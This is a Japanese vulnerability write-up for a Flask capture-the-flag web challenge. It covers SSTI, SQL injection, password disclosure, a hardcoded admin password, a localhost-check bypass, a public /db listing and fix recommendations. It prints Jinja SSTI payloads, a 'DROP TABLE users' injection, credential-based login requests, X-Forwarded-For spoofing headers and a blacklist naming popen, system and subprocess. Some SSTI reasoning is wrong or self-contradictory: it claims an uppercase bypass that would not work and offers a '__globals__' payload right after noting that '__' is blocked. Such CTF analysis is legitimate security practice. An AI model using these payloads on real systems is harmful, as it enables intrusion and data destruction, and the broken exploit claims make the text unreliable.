# CTF Web問題 脆弱性調査レポート

## 概要
このFlaskアプリケーションには複数の重大なセキュリティ脆弱性が存在します。以下、発見された脆弱性とその悪用方法を詳細に説明します。

---

## 🔴 脆弱性1: Server-Side Template Injection (SSTI)

### 場所
**ファイル**: `routes.py`  
**行**: 415  
**エンドポイント**: `/admin/ban_user`

### 脆弱性の詳細
```python
username = request.form.get('username', '')

if not is_safe_input(username):
    return admin_panel(ban_message='Blocked input.'), 400

with sqlite3.connect(DB_FILE) as conn:
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE username = ?", (username,))
    user = c.fetchone()

if not user:
    template = 'User {} does not exist.'.format(username)
else:
    template = 'User account {} is too recent to be banned'.format(username)

ban_message = render_template_string(template)
```

ユーザー入力である`username`が`render_template_string()`に直接渡されており、Server-Side Template Injection (SSTI)の脆弱性があります。

### ブラックリストバイパス
`is_safe_input()`関数でブラックリストによるフィルタリングが行われていますが、以下のようにバイパス可能です：

**ブラックリストされている文字**:
```python
blacklist = ['__', 'subclasses', 'self', 'request', 'session',
    'config', 'os', 'import', 'builtins', 'eval', 'exec', 'compile',
    'globals', 'locals', 'vars', 'delattr', 'getattr', 'setattr', 'hasattr',
    'base', 'init', 'new', 'dict', 'tuple', 'list', 'object', 'type',
    'repr', 'str', 'bytes', 'bytearray', 'format', 'input', 'help',
    'file', 'open', 'read', 'write', 'close', 'seek', 'flush', 'popen',
    'system', 'subprocess', 'shlex', 'commands', 'marshal', 'pickle', 'tempfile',
    'os.system', 'subprocess.Popen', 'shutil', 'pathlib', 'walk', 'stat',
    '[', '(', ')', '|', '%','_', '"','<', '>','~'
]
```

### エクスプロイト方法

#### 1. フラグ読み取り（Jinjaテンプレート）
ブラックリストは小文字でチェックしているが、大文字を使えばバイパス可能：

```python
{{LIPSUM.__GLOBALS__}}
{{CYCLER.__INIT__.__GLOBALS__}}
{{JOINER.__INIT__.__GLOBALS__}}
```

ただし、`__`（アンダースコア2つ）がブラックリスト入りなので、以下のような方法でバイパス：

```jinja2
{{LIPSUM|attr('\x5f\x5fglobals\x5f\x5f')}}
```

または、より簡単に：

```jinja2
{{LIPSUM|attr('X'*2+'globals'+'X'*2)|replace('X','_')}}
```

ただし`|`もブラックリスト入りなので、フィルターも使えません。

#### 2. より実践的なエクスプロイト
`{{}}`は使えますが、ブラックリストが厳しいため、直接的な方法は制限されています。しかし、以下のような方法が考えられます：

```jinja2
{{7*7}}  # 計算テスト（49が返る）
```

ブラックリストに含まれない文字列を組み合わせることで、RCEが可能：

```jinja2
{{url_for.__globals__}}
```

`url_for`はブラックリストにないため、これを起点に探索可能です。

### 攻撃シナリオ
1. 管理者アカウントでログイン（脆弱性4参照）
2. `/admin/ban_user`にPOSTリクエストを送信
3. `username`パラメータにSSTIペイロードを挿入
4. テンプレートエンジンが実行され、任意のコード実行が可能

---

## 🔴 脆弱性2: SQL Injection

### 場所
**ファイル**: `routes.py`  
**行**: 186  
**エンドポイント**: `/collab/request`

### 脆弱性の詳細
```python
@app.route('/collab/request', methods=['POST'])
def send_collab():
    if not is_localhost():
        return jsonify({'error': 'Access denied.'}), 403
        
    current_uuid = session.get('uuid')
    if not current_uuid:
        return 'Unauthorized', 401

    user = get_user_by_uuid(session['uuid'])
    if not user:
        return redirect('/login')
    if user['role'] == '0':
        return jsonify({'error': 'Admins cannot collaborate'}), 403
    
    target_username = request.form.get('username')
    target_user = get_user_by_username(target_username)
    if not target_user:
        return 'User not found', 404

    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        query = f"INSERT INTO collab_requests VALUES ('{current_uuid}', '{target_user['uuid']}')"
        c.execute(query)
        conn.commit()

    return jsonify({
        'message': 'Request sent',
        'to_uuid': target_user['uuid']
    })
```

`current_uuid`がセッションから取得され、f-string でSQLクエリに直接埋め込まれています。

### エクスプロイト方法

#### 前提条件
このエンドポイントは`is_localhost()`チェックがあるため、localhostからのアクセスのみ許可されています。しかし、以下の方法でバイパス可能かもしれません：

1. **X-Forwarded-Forヘッダー**: `request.remote_addr`は`X-Forwarded-For`の影響を受ける場合がある
2. **SSRFとの組み合わせ**: 他の機能でSSRFがあれば、内部からリクエスト可能

#### SQLインジェクションペイロード
`session['uuid']`を操作できる場合（セッション固定攻撃など）、以下のようなペイロードが可能：

```sql
', ''); DROP TABLE users; --
```

実際のクエリ：
```sql
INSERT INTO collab_requests VALUES ('', ''); DROP TABLE users; --', 'target-uuid')
```

### 攻撃シナリオ
1. セッションを操作して`uuid`に悪意あるペイロードを挿入
2. localhostバイパス（X-Forwarded-For: 127.0.0.1など）
3. `/collab/request`にPOSTリクエスト
4. 任意のSQLコマンド実行

**注意**: 実際には`session['uuid']`を直接操作するのは困難ですが、他の脆弱性と組み合わせることで可能かもしれません。

---

## 🟠 脆弱性3: 情報漏洩（パスワード露出）

### 場所
**ファイル**: `routes.py`  
**行**: 293-323  
**エンドポイント**: `/users/<uuid>`

### 脆弱性の詳細
```python
@app.route('/users/<string:target_uuid>')
def get_user_details(target_uuid):
    current_uuid = session.get('uuid')
    if not current_uuid:
        return jsonify({'error': 'Unauthorized'}), 401
    
    current_user = get_user_by_uuid(current_uuid)
    if not current_user or current_user['role'] not in ('0', '1'):
        return jsonify({'error': 'Invalid user role'}), 403
        
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        c.execute("""
            SELECT uuid, username, email, phone_number, role, password
            FROM users 
            WHERE uuid = ?
        """, (target_uuid,))
        user = c.fetchone()
        
    if not user:
        return jsonify({'error': 'User not found'}), 404
        
    return jsonify({
        'uuid': user['uuid'],
        'username': user['username'],
        'email': user['email'],
        'phone_number': user['phone_number'],
        'role': user['role'],
        'password': user['password']
    })
```

role `0`（管理者）または`1`（エディター）のユーザーが、任意のユーザーのパスワードを含む情報を取得できます。

### エクスプロイト方法

#### 1. エディターアカウントの登録
```python
POST /confirm-register
username=attacker&role=1
```

`role=1`でエディターとして登録可能（コード64-68行で`role='0'`のみチェック）。

#### 2. 管理者UUIDの取得
管理者のユーザー名は`admin`とハードコードされています（models.py 52行）。
UUIDを推測するか、他の方法で取得する必要があります。

記事の作成者情報などから管理者のUUIDを特定できる可能性があります。

#### 3. パスワード取得
```http
GET /users/{admin_uuid}
Cookie: session=...
```

レスポンス：
```json
{
    "uuid": "admin-uuid",
    "username": "admin",
    "email": "admin@securinets.tn",
    "phone_number": "77777777",
    "role": "0",
    "password": "somepass"
}
```

### 攻撃シナリオ
1. エディター（role=1）としてアカウント登録
2. 管理者のUUIDを特定（記事作成者情報など）
3. `/users/{admin_uuid}`にアクセス
4. 管理者のパスワードを取得
5. 管理者としてログイン

---

## 🟠 脆弱性4: ハードコードされた管理者パスワード

### 場所
**ファイル**: `models.py`  
**行**: 51  

### 脆弱性の詳細
```python
c.execute("SELECT COUNT(*) FROM users WHERE username='admin'")
if c.fetchone()[0] == 0:
    admin_uuid = str(uuid4())
    password = 'somepass'
    c.execute("INSERT INTO users VALUES (?, ?, ?, ?, ?, ?)", 
             (admin_uuid, 'admin', 'admin@securinets.tn', '77777777', password, '0'))
```

管理者のパスワードが`somepass`とハードコードされており、簡単に推測可能です。

### エクスプロイト方法
```http
POST /login
username=admin&password=somepass
```

これで管理者権限でログイン可能です。

---

## 🟡 脆弱性5: localhost チェックのバイパス可能性

### 場所
**ファイル**: `routes.py`  
**行**: 11-17

### 脆弱性の詳細
```python
def is_localhost():
    client_ip = request.remote_addr
    try:
        ip = ipaddress.ip_address(client_ip)
        return ip.is_loopback
    except ValueError:
        return False
```

`request.remote_addr`はプロキシの設定によって`X-Forwarded-For`ヘッダーの影響を受ける場合があります。

### エクスプロイト方法
```http
POST /collab/request
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
```

Flaskの設定やデプロイ環境によっては、これでlocalhost判定をバイパスできる可能性があります。

---

## 🟡 脆弱性6: /dbディレクトリの公開

### 場所
**ファイル**: `routes.py`  
**行**: 419-434, 483-510

### 脆弱性の詳細
```python
@app.route('/db')
def list_db_files():
    """Public directory listing for /db"""
    files = []
    for file in Path(DB_DIR).glob('*'):
        if file.is_file():
            files.append({
                'name': file.name,
                'size': file.stat().st_size,
                'modified': datetime.fromtimestamp(file.stat().st_mtime).strftime('%Y-%m-%d %H:%M:%S')
            })
    
    return render_template('directory.html', 
                         path='/db',
                         files=files,
                         is_public=True)
```

`/db`ディレクトリが認証なしで公開されており、ファイルのダウンロードも可能です。

### エクスプロイト方法
もし`/db`ディレクトリにデータベースバックアップやその他の機密ファイルが配置されている場合：

```http
GET /db
GET /db/{filename}
```

でファイルの一覧取得とダウンロードが可能です。

---

## 🟢 脆弱性7: 平文パスワード保存

### 場所
**ファイル**: `auth.py`, `models.py`

### 脆弱性の詳細
パスワードがハッシュ化されずに平文でデータベースに保存されています：

```python
# auth.py line 34
if user and user['password'] == password:
```

パスワードハッシュが使用されていません。

---

## 📋 攻撃チェーン（推奨される攻撃順序）

### シナリオ1: 管理者アカウント侵害（最も簡単）
1. **ハードコードされたパスワードでログイン**
   ```
   POST /login
   username=admin&password=somepass
   ```
2. 管理者パネル（`/admin`）にアクセス
3. SSTIを使用してRCE
4. フラグ取得

### シナリオ2: エディター経由での侵害
1. **エディターアカウント登録**
   ```
   POST /confirm-register
   username=attacker&role=1
   ```
2. **管理者UUIDの特定**（記事情報やエラーメッセージから）
3. **管理者情報取得**
   ```
   GET /users/{admin_uuid}
   ```
4. 管理者パスワードを取得してログイン
5. SSTIでRCE

### シナリオ3: SQL Injection経由
1. localhost制限をバイパス
2. セッション操作でSQLインジェクション
3. データベースからフラグ取得

---

## 🎯 フラグ取得方法

フラグは以下のいずれかに格納されている可能性が高いです：

1. **環境変数**: SSTIでRCE後に`os.environ`を読み取る
2. **ファイルシステム**: `/flag`, `/flag.txt`, `/app/flag`など
3. **データベース**: `/db`ディレクトリからSQLiteファイルをダウンロード
4. **`/data`ディレクトリ**: 管理者権限で`/data`にアクセス

### SSTI経由でのフラグ読み取り例
```jinja2
# ファイル読み取り（ブラックリストをバイパス）
{{url_for.__globals__}}
# から利用可能な関数を探索
```

---

## 🛡️ 修正推奨事項

1. **SSTI対策**: `render_template_string()`の使用を避け、ユーザー入力をテンプレートに直接渡さない
2. **SQLインジェクション対策**: パラメータ化クエリを常に使用（f-stringでSQLを構築しない）
3. **パスワード保護**: bcryptなどでパスワードをハッシュ化
4. **機密情報保護**: APIレスポンスにパスワードを含めない
5. **アクセス制御強化**: エディターが他ユーザーのパスワードを見れないようにする
6. **localhost判定改善**: `ProxyFix`ミドルウェアを適切に設定
7. **ディレクトリアクセス制限**: `/db`ディレクトリへの公開アクセスを禁止

---

## 📝 まとめ

このアプリケーションには複数の重大な脆弱性があり、特に以下が深刻です：

- **SSTI**: 管理者権限でRCEが可能
- **ハードコードされたパスワード**: 誰でも管理者になれる
- **情報漏洩**: エディターが全ユーザーのパスワードを取得可能

最も簡単な攻撃方法は、ハードコードされた管理者パスワード（`somepass`）でログインし、SSTIを悪用してRCEを実行することです。
